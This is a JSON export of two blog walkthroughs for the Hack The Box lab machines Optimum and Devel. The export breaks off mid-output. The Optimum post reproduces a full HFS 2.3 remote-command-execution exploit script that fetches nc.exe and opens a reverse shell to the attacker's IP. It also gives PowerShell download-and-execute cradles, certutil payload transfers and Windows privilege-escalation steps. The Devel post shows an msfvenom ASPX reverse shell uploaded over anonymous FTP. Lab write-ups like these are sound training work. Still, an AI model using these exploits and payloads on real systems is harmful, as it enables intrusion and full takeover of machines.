[{"content":"\r\rEnumeration 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  nmap -p- -vv 10.10.10.8 Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-19 17:03 EST Initiating Ping Scan at 17:03 Scanning 10.10.10.8 [4 ports] Completed Ping Scan at 17:03, 2.05s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 17:03 Completed Parallel DNS resolution of 1 host. at 17:03, 0.01s elapsed Initiating SYN Stealth Scan at 17:03 Scanning 10.10.10.8 [65535 ports] Discovered open port 80/tcp on 10.10.10.8 SYN Stealth Scan Timing: About 19.51% done; ETC: 17:06 (0:02:08 remaining) SYN Stealth Scan Timing: About 47.42% done; ETC: 17:05 (0:01:08 remaining) Completed SYN Stealth Scan at 17:05, 105.28s elapsed (65535 total ports) Nmap scan report for 10.10.10.8 Host is up, received timestamp-reply ttl 127 (0.018s latency). Scanned at 2022-12-19 17:03:42 EST for 105s Not shown: 65534 filtered tcp ports (no-response) PORT STATE SERVICE REASON 80/tcp open http syn-ack ttl 127 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 107.46 seconds Raw packets sent: 131157 (5.771MB) | Rcvd: 82 (3.604KB)   1 2 3 4 5 6 7 8 9 10  nmap -sV -sC -vv -p 80 10.10.10.8 -oN optimum_scan.txt PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack ttl 127 HttpFileServer httpd 2.3 |_http-server-header: HFS 2.3 | http-methods: |_ Supported Methods: GET HEAD POST |_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1 |_http-title: HFS / Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows   Exploitation w/Metasploit 1 2 3 4 5  msf6 \u0026gt; search hfs 2.3 1 exploit/windows/http/rejetto_hfs_exec 2014-09-11 excellent Yes Rejetto HttpFileServer Remote Command Execution msf6 \u0026gt; use exploit/windows/http/rejetto_hfs_exec   1 2 3 4 5  msf6 exploit(windows/http/rejetto_hfs_exec) \u0026gt; set rhosts 10.10.10.8 msf6 exploit(windows/http/rejetto_hfs_exec) \u0026gt; set lhost 10.10.14.12 msf6 exploit(windows/http/rejetto_hfs_exec) \u0026gt; run   1 2 3 4 5 6 7 8 9 10  meterpreter\u0026gt; background meterpreter\u0026gt; use post/multi/recon/local_exploit_suggester meterpreter\u0026gt; set session 1 # Name Potentially Vulnerable? Check Result - ---- ----------------------- ------------ 1 exploit/windows/local/bypassuac_eventvwr Yes The target appears to be vulnerable. 2 exploit/windows/local/ms16_032_secondary_logon_handle_privesc Yes The service is running, but could not be validated.   1 2 3 4 5  meterpreter\u0026gt; use exploit/windows/local/ms16_032_secondary_logon_handle_privesc meterpreter\u0026gt; set session 1 meterpreter\u0026gt; set lhost 10.10.14.12 meterpreter\u0026gt; run   w/o Metasploit 1 2 3  serachsploit hfs searchsploit -m windows/remote/39161.py    Modify the payload and add our IP address and local listening port  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49  #!/usr/bin/python # Exploit Title: HttpFileServer 2.3.x Remote Command Execution # Google Dork: intext:\u0026#34;httpfileserver 2.3\u0026#34; # Date: 04-01-2016 # Remote: Yes # Exploit Author: Avinash Kumar Thapa aka \u0026#34;-Acid\u0026#34; # Vendor Homepage: http://rejetto.com/ # Software Link: http://sourceforge.net/projects/hfs/ # Version: 2.3.x # Tested on: Windows Server 2008 , Windows 8, Windows 7 # CVE : CVE-2014-6287 # Description: You can use HFS (HTTP File Server) to send and receive files. #\tIt\u0026#39;s different from classic file sharing because it uses web technology to be more compatible with today\u0026#39;s Internet. #\tIt also differs from classic web servers because it\u0026#39;s very easy to use and runs \u0026#34;right out-of-the box\u0026#34;. Access your remote files, over the network. It has been successfully tested with Wine under Linux. #Usage : python Exploit.py \u0026lt;Target IP address\u0026gt; \u0026lt;Target Port Number\u0026gt; #EDB Note: You need to be using a web server hosting netcat (http://\u0026lt;attackers_ip\u0026gt;:80/nc.exe). # You may need to run it multiple times for success! import urllib2 import sys try: def script_create(): urllib2.urlopen(\u0026#34;http://\u0026#34;+sys.argv[1]+\u0026#34;:\u0026#34;+sys.argv[2]+\u0026#34;/?search=%00{.+\u0026#34;+save+\u0026#34;.}\u0026#34;) def execute_script(): urllib2.urlopen(\u0026#34;http://\u0026#34;+sys.argv[1]+\u0026#34;:\u0026#34;+sys.argv[2]+\u0026#34;/?search=%00{.+\u0026#34;+exe+\u0026#34;.}\u0026#34;) def nc_run(): urllib2.urlopen(\u0026#34;http://\u0026#34;+sys.argv[1]+\u0026#34;:\u0026#34;+sys.argv[2]+\u0026#34;/?search=%00{.+\u0026#34;+exe1+\u0026#34;.}\u0026#34;) ip_addr = \u0026#34;10.10.14.12\u0026#34; #local IP address local_port = \u0026#34;1234\u0026#34; # Local Port number vbs = \u0026#34;C:\\Users\\Public\\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F\u0026#34;+ip_addr+\u0026#34;%2Fnc.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with\u0026#34; save= \u0026#34;save|\u0026#34; + vbs vbs2 = \u0026#34;cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs\u0026#34; exe= \u0026#34;exec|\u0026#34;+vbs2 vbs3 = \u0026#34;C%3A%5CUsers%5CPublic%5Cnc.exe%20-e%20cmd.exe%20\u0026#34;+ip_addr+\u0026#34;%20\u0026#34;+local_port exe1= \u0026#34;exec|\u0026#34;+vbs3 script_create() execute_script() nc_run() except: print \u0026#34;\u0026#34;\u0026#34;[.]Something went wrong..! Usage is :[.] python exploit.py \u0026lt;Target IP address\u0026gt; \u0026lt;Target Port Number\u0026gt; Don\u0026#39;t forgot to change the Local IP address and Port number on the script\u0026#34;\u0026#34;\u0026#34;    The payload indicates that nc.exe is needed and hosted in our machine  1 2 3 4 5  cp /usr/share/windows-resources/binaries/nc.exe ./ python -m http.server 80 nc -lvnp 1234    Might need to launch the attack twice  1 2 3  python2 39161.py 10.10.10.8 80 # [Target IP] [Target port ] python2 39161.py 10.10.10.8 80 # [Target IP] [Target port ]   Privilege Escalation  Using windows exploit suggester  python2 /opt/Windows-Exploit-Suggester/windows-exploit-suggester.py --database /opt/Windows-Exploit-Suggester/2022-12-18-mssb.xls --systeminfo systeminfo.txt\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97  [E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important [*] https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135) [*] https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - \u0026#39;win32k.sys\u0026#39; \u0026#39;NtSetWindowLongPtr\u0026#39; Privilege Escalation (MS16-135) (2) [*] https://github.com/tinysec/public/tree/master/CVE-2016-7255 [*] [E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important [*] https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098) [*] [M] MS16-075: Security Update for Windows SMB Server (3164038) - Important [*] https://github.com/foxglovesec/RottenPotato [*] https://github.com/Kevin-Robertson/Tater [*] https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege [*] https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation [*] [E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important [*] https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC [*] https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC [*] [E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical [*] https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC [*] [E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important [*] https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF [*] https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC [*] https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 \u0026amp; Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC [*] https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 \u0026amp; Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#) [*] [M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important [*] https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF [*] https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC [*] https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC [*] [E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important [*] Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC [*] [E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important [*] https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC [*] https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC [*] [E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important [*] https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC [*] https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting (MS15-134), PoC [*] [E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical [*] https://www.exploit-db.com/exploits/39698/ -- Internet Explorer 9/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read (MS15-112) [*] [E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important [*] https://www.exploit-db.com/exploits/38474/ -- Windows 10 Sandboxed Mount Reparse Point Creation Mitigation Bypass (MS15-111), PoC [*] [E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important [*] https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC [*] https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC [*] https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC [*] [E] MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical [*] https://www.exploit-db.com/exploits/38198/ -- Windows 10 Build 10130 - User Mode Font Driver Thread Permissions Privilege Escalation, PoC [*] https://www.exploit-db.com/exploits/38199/ -- Windows NtUserGetClipboardAccessToken Token Leak, PoC [*] [M] MS15-078: Vulnerability in Microsoft Font Driver Could Allow Remote Code Execution (3079904) - Critical [*] https://www.exploit-db.com/exploits/38222/ -- MS15-078 Microsoft Windows Font Driver Buffer Overflow [*] [E] MS15-052: Vulnerability in Windows Kernel Could Allow Security Feature Bypass (3050514) - Important [*] https://www.exploit-db.com/exploits/37052/ -- Windows - CNG.SYS Kernel Security Feature Bypass PoC (MS15-052), PoC [*] [M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important [*] https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC [*] https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF [*] [E] MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical [*] https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows 8.1 - win32k Local Privilege Escalation (MS15-010), PoC [*] https://www.exploit-db.com/exploits/37098/ -- Microsoft Windows - Local Privilege Escalation (MS15-010), PoC [*] https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows win32k Local Privilege Escalation (MS15-010), PoC [*] [E] MS15-001: Vulnerability in Windows Application Compatibility Cache Could Allow Elevation of Privilege (3023266) - Important [*] http://www.exploit-db.com/exploits/35661/ -- Windows 8.1 (32/64 bit) - Privilege Escalation (ahcache.sys/NtApphelpCacheControl), PoC [*] [E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical [*] http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC [*] [M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical [*] https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC [*] http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), PoC [*] http://www.exploit-db.com/exploits/35229/ -- Internet Explorer \u0026lt;= 11 - OLE Automation Array Remote Code Execution (#1), PoC [*] http://www.exploit-db.com/exploits/35230/ -- Internet Explorer \u0026lt; 11 - OLE Automation Array Remote Code Execution (MSF), MSF [*] http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF [*] http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF [*] [M] MS14-060: Vulnerability in Windows OLE Could Allow Remote Code Execution (3000869) - Important [*] http://www.exploit-db.com/exploits/35055/ -- Windows OLE - Remote Code Execution \u0026#39;Sandworm\u0026#39; Exploit (MS14-060), PoC [*] http://www.exploit-db.com/exploits/35020/ -- MS14-060 Microsoft Windows OLE Package Manager Code Execution, MSF [*] [M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical [*] http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF [*] [E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important [M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical [*] done   MS16-098  https://www.exploit-db.com/exploits/41020/ There is a binary of this exploit at: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41020.exe  wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41020.exe\n Transfering the file to the windows machine  powershell wget http://10.10.14.12/41020.exe -OutFile 41020.exe\nC:\\Users\\kostas\\Desktop\u0026gt;41020.exe\nMS16-032  Exploit payload: https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1 Nishang shell: https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1  1 2 3  wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1 wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1    Add at the end of both scripts the following  Invoke-MS16032.ps1\nInvoke-MS16032 -Command \u0026quot;iex(New-Object Net.WebClient).DownloadString('http://10.10.14.12/Invoke-PowerShellTcp.ps1')\u0026quot;\nInvoke-PowerShellTcp.ps1\n Add to the end of the Invoke-PowerShellTcp.ps1 script  Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.12 -Port 1234\n1 2 3  nc -lvnp 1234 python -m http.server 80 # To host the files    Execute payload  powershell iex (New-Object Net.WebClient).DownloadString('http://\u0026lt;yourwebserver\u0026gt;/Invoke-PowerShellTcp.ps1')\npowershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.12/Invoke-MS16032.ps1')\n No elevation of privilege was successful because we are in a system x64 and netcat is x32 bit Launching the x32 bit version will fix this issue  C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0l\\powershell.exe iex (New-Object Net.WebClient).DownloadString('http://10.10.14.12/Invoke-MS16032.ps1')\nCould not have this work. Then tried the following payload\n payload: https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-032/x64/ms16-032.exe  python -m http.server 80\nTransfer the payload to the victim’s machine\ncertutil -urlcache -f http://10.10.14.12/ms16-032.exe ms16-032.exe\nC:\\Users\\kostas\\Desktop\u0026gt; ms16-032.exe\nSkills Learned  Identifying vulnerable services Identifying known exploits Basic Windows privilege escalation techniques  ","description":"Optimum is a beginner-level machine which mainly focuses on enumeration of services with known exploits. Both exploits are easy to obtain and have associated Metasploit modules, making this machine fairly simple to complete.","id":0,"section":"posts","tags":["Hackthebox","OSCP","hfs","python","network","vulnerability assessment","injection","outdated software","security tools","metasploit","os command injection"],"title":"Hackthebox - Optimum","uri":"https://hswootan.github.io/en/posts/optimum/"},{"content":"\r\rEnumeration 1 2 3 4 5  nmap -p- 10.10.10.5 PORT STATE SERVICE 21/tcp open ftp 80/tcp open http   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  nmap -sV -sC -vv -p 21,80 10.10.10.5 -oN devel_scan.txt PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack ttl 127 Microsoft ftpd | ftp-syst: |_ SYST: Windows_NT | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 03-18-17 02:06AM \u0026lt;DIR\u0026gt; aspnet_client | 03-17-17 05:37PM 689 iisstart.htm |_03-17-17 05:37PM 184946 welcome.png 80/tcp open http syn-ack ttl 127 Microsoft IIS httpd 7.5 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-title: IIS7 |_http-server-header: Microsoft-IIS/7.5 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows   1 2 3 4 5 6 7 8 9  msf6 \u0026gt; searchsploit iis 7.5 [*] exec: searchsploit iis 7.5 ------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------------------------------------------------------- --------------------------------- Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities | windows/remote/19033.txt Microsoft IIS 7.5 (Windows 7) - FTPSVC Unauthorized Remote Denial of Service (PoC) | windows/dos/15803.py ------------------------------------------------------------------------------------------------------------- ---------------------------------   Exploitation Logged in as anonymous through FTP\n1 2 3 4  ftp 10.10.10.5 user: anonymous password: [skip]   1 2 3 4 5 6  ftp\u0026gt; ls 229 Entering Extended Passive Mode (|||49195|) 125 Data connection already open; Transfer starting. 03-18-17 02:06AM \u0026lt;DIR\u0026gt; aspnet_client 03-17-17 05:37PM 689 iisstart.htm 03-17-17 05:37PM 184946 welcome.png   1 2 3 4 5 6 7 8 9 10 11  echo \u0026#34;test\u0026#34; \u0026gt; test.txt ftp\u0026gt; put test.txt ftp\u0026gt; ls 229 Entering Extended Passive Mode (|||49198|) 125 Data connection already open; Transfer starting. 03-18-17 02:06AM \u0026lt;DIR\u0026gt; aspnet_client 03-17-17 05:37PM 689 iisstart.htm 07-29-22 02:25AM 6 test.txt 03-17-17 05:37PM 184946 welcome.png   Going into http://10.10.10.5/test.txt\n1 2 3  msfvenom -h msfvenom -l payloads msfvenom -l format   Windows ASPX reverse shell msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=1234 -f aspx -o shell.aspx\nmsfconsole\ruse exploit/multi/handler\rmsf6 exploit(multi/handler) \u0026gt; set lhost 10.10.14.7\rmsf6 exploit(multi/handler) \u0026gt; set lport 1234\rmsf6 exploit(multi/handler) \u0026gt; set payload windows/meterpreter/reverse_tcp put shell.aspx\nExecute the payload http://10.10.10.5/shell.aspx\n1 2 3 4  meterpreter \u0026gt; getuid Server username: IIS APPPOOL\\Web meterpreter \u0026gt; shell   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44  c:\\Users\u0026gt;systeminfo systeminfo Host Name: DEVEL OS Name: Microsoft Windows 7 Enterprise OS Version: 6.1.7600 N/A Build 7600 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Workstation OS Build Type: Multiprocessor Free Registered Owner: babis Registered Organization: Product ID: 55041-051-0948536-86302 Original Install Date: 17/3/2017, 4:17:31 �� System Boot Time: 28/7/2022, 5:48:02 �� System Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: X86-based PC Processor(s): 1 Processor(s) Installed. [01]: x64 Family 6 Msodel 85 Stepping 7 GenuineIntel ~2294 Mhz BIOS Version: Phoenix Technologies LTD 6.00, 12/12/2018 Windows Directory: C:\\Windows System Directory: C:\\Windows\\system32 Boot Device: \\Device\\HarddiskVolume1 System Locale: el;Greek Input Locale: en-us;English (United States) Time Zone: (UTC+02:00) Athens, Bucharest, Istanbul Total Physical Memory: 3.071 MB Available Physical Memory: 2.471 MB Virtual Memory: Max Size: 6.141 MB Virtual Memory: Available: 5.553 MB Virtual Memory: In Use: 588 MB Page File Location(s): C:\\pagefile.sys Domain: HTB Logon Server: N/A Hotfix(s): N/A Network Card(s): 1 NIC(s) Installed. [01]: vmxnet3 Ethernet Adapter Connection Name: Local Area Connection 3 DHCP Enabled: No IP address(es) [01]: 10.10.10.5 [02]: fe80::58c0:f1cf:abc6:bb9e [03]: dead:beef::1cb5:22e4:b3b1:c5f5 [04]: dead:beef::58c0:f1cf:abc6:bb9e   Privilege Escalation 1 2 3 4 5  meterpreter\u0026gt; search suggester meterpreter\u0026gt; post/multi/recon/local_exploit_suggester meterpreter\u0026gt; set session 1 meterpreter\u0026gt; run   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38  [*] 10.10.10.5 - Collecting local exploits for x86/windows... [*] 10.10.10.5 - 175 exploit checks are being tried... [+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated. [+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated. [+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated. [+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated. [+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated. [+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable. [*] Running check method for exploit 41 / 41 [*] 10.10.10.5 - Valid modules for session 1: ============================ # Name Potentially Vulnerable? Check Result - ---- ----------------------- ------------ 1 exploit/windows/local/bypassuac_eventvwr Yes The target appears to be vulnerable. 2 exploit/windows/local/ms10_015_kitrap0d Yes The service is running, but could not be validated. 3 exploit/windows/local/ms10_092_schelevator Yes The service is running, but could not be validated. 4 exploit/windows/local/ms13_053_schlamperei Yes The target appears to be vulnerable. 5 exploit/windows/local/ms13_081_track_popup_menu Yes The target appears to be vulnerable. 6 exploit/windows/local/ms14_058_track_popup_menu Yes The target appears to be vulnerable. 7 exploit/windows/local/ms15_004_tswbproxy Yes The service is running, but could not be validated. 8 exploit/windows/local/ms15_051_client_copy_image Yes The target appears to be vulnerable. 9 exploit/windows/local/ms16_016_webdav Yes The service is running, but could not be validated. 10 exploit/windows/local/ms16_032_secondary_logon_handle_privesc Yes The service is running, but could not be validated. 11 exploit/windows/local/ms16_075_reflection Yes The target appears to be vulnerable. 12 exploit/windows/local/ntusermndragover Yes The target appears to be vulnerable. 13 exploit/windows/local/ppr_flatten_rec Yes The target appears to be vulnerable. The check raised an exception. [*] Post module execution completed msf6 post(multi/recon/local_exploit_suggester) \u0026gt;   Tried windows/local/ms16_075_reflection (could not elevate privileges)\n1 2 3  msf6 exploit(windows/local/ms15_051_client_copy_image) \u0026gt; set session 1 msf6 exploit(windows/local/ms15_051_client_copy_image) \u0026gt; set lhost tun0 msf6 exploit(windows/local/ms15_051_client_copy_image) \u0026gt; run   w/o Metasploit Crafting payload\nmsfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.12 LPORT=1234 -f aspx \u0026gt; shell.aspx\nListening\nnc -lvnp 1234\n Going to 10.10.10.5/shell.aspx to exploit  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44  c:\\windows\\system32\\inetsrv\u0026gt;systeminfo systeminfo Host Name: DEVEL OS Name: Microsoft Windows 7 Enterprise OS Version: 6.1.7600 N/A Build 7600 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Workstation OS Build Type: Multiprocessor Free Registered Owner: babis Registered Organization: Product ID: 55041-051-0948536-86302 Original Install Date: 17/3/2017, 4:17:31 �� System Boot Time: 18/12/2022, 10:17:13 �� System Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: X86-based PC Processor(s): 1 Processor(s) Installed. [01]: x64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz BIOS Version: Phoenix Technologies LTD 6.00, 12/12/2018 Windows Directory: C:\\Windows System Directory: C:\\Windows\\system32 Boot Device: \\Device\\HarddiskVolume1 System Locale: el;Greek Input Locale: en-us;English (United States) Time Zone: (UTC+02:00) Athens, Bucharest, Istanbul Total Physical Memory: 3.071 MB Available Physical Memory: 2.493 MB Virtual Memory: Max Size: 6.141 MB Virtual Memory: Available: 5.561 MB Virtual Memory: In Use: 580 MB Page File Location(s): C:\\pagefile.sys Domain: HTB Logon Server: N/A Hotfix(s): N/A Network Card(s): 1 NIC(s) Installed. [01]: vmxnet3 Ethernet Adapter Connection Name: Local Area Connection 3 DHCP Enabled: No IP address(es) [01]: 10.10.10.5 [02]: fe80::58c0:f1cf:abc6:bb9e [03]: dead:beef::58c0:c14d:73fa:2284 [04]: dead:beef::58c0:f1cf:abc6:bb9e   Using Windows Suggester to find info on priv esc\ngit clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git\nInstalling dependencies and fixing issues\n1 2 3 4 5  pip install xlrd --upgrade wget https://bootstrap.pypa.io/pip/2.7/get-pip.py python2 get-pip python2 -m pip install --user xlrd==1.1.0   https://github.com/AonCyberLabs/Windows-Exploit-Suggester/issues/43\nRunning Windows Exploit Suggester\npython2 windows-exploit-suggester.py --update\nSave the in a file the systeminfo output\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41  Host Name: DEVEL OS Name: Microsoft Windows 7 Enterprise OS Version: 6.1.7600 N/A Build 7600 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Workstation OS Build Type: Multiprocessor Free Registered Owner: babis Registered Organization: Product ID: 55041-051-0948536-86302 Original Install Date: 17/3/2017, 4:17:31 �� System Boot Time: 18/12/2022, 10:17:13 �� System Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: X86-based PC Processor(s): 1 Processor(s) Installed. [01]: x64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz BIOS Version: Phoenix Technologies LTD 6.00, 12/12/2018 Windows Directory: C:\\Windows System Directory: C:\\Windows\\system32 Boot Device: \\Device\\HarddiskVolume1 System Locale: el;Greek Input Locale: en-us;English (United States) Time Zone: (UTC+02:00) Athens, Bucharest, Istanbul Total Physical Memory: 3.071 MB Available Physical Memory: 2.493 MB Virtual Memory: Max Size: 6.141 MB Virtual Memory: Available: 5.561 MB Virtual Memory: In Use: 580 MB Page File Location(s): C:\\pagefile.sys Domain: HTB Logon Server: N/A Hotfix(s): N/A Network Card(s): 1 NIC(s) Installed. [01]: vmxnet3 Ethernet Adapter Connection Name: Local Area Connection 3 DHCP Enabled: No IP address(es) 